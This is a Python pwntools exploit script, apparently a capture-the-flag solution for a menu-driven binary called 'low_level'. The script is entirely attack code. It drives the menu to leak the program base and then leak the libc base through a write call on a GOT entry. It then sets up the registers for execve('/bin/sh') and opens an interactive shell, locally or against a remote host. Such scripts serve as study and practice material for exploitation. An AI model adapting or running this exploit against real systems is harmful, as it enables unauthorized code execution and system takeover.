#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './low_level' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    # pop value into rdi
    io.sendlineafter(b'>>', b'5')
    io.sendlineafter(b'>>', b'5')
    io.sendlineafter(b'>>', b'7')
    
    # get elf base
    io.recvuntil(b'RDI: ')
    io.recvuntil(b'0x')
    elf.address = int(io.recvline().strip(), 16) - 0x47099
    info(f'Elf base: {hex(elf.address)}')
    
    # xor rax, rdi, rsi, rdx
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'1')
    
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'4')
    io.sendlineafter(b'>>', b'4')
    
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'5')
    io.sendlineafter(b'>>', b'5')
    
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'6')
    io.sendlineafter(b'>>', b'6')
    
    # add rax, 1; rdi, 1; rsi, elf.got['puts']; rdx, 8
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', b'1') # add 1
    io.sendlineafter(b'>>', b'1') # rax
    
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', b'1') # add 1
    io.sendlineafter(b':', b'5') # rdi
    
    write = elf.got['write']
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', f'{hex(write)[2:]}'.encode())
    io.sendlineafter(b':', b'6') # rsi
    
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', b'8') # add 8
    io.sendlineafter(b':', b'4') # rdx
    
    io.sendlineafter(b'>>', b'6')
    io.recvuntil(b'>> ')
    libc.address = u64(io.recv(8)) - libc.sym['write']
    info(f'libc base: {hex(libc.address)}')
    
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'1')
    
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'4')
    io.sendlineafter(b'>>', b'4')
    
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'5')
    io.sendlineafter(b'>>', b'5')
    
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'6')
    io.sendlineafter(b'>>', b'6')
    
    # call execve /bin/sh
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', f'{hex(0x3b)[2:]}'.encode()) # add 59
    io.sendlineafter(b'>>', b'1') # rax
    
    binsh = next(libc.search(b'/bin/sh\x00'))
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', f'{hex(binsh)[2:]}'.encode()) # add addr binsh
    io.sendlineafter(b':', b'5') # rdi
    
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b':', b'6') # rsi
    
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b':', b'4') # rdx
    
    io.sendlineafter(b'>>', b'6') # call execve
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()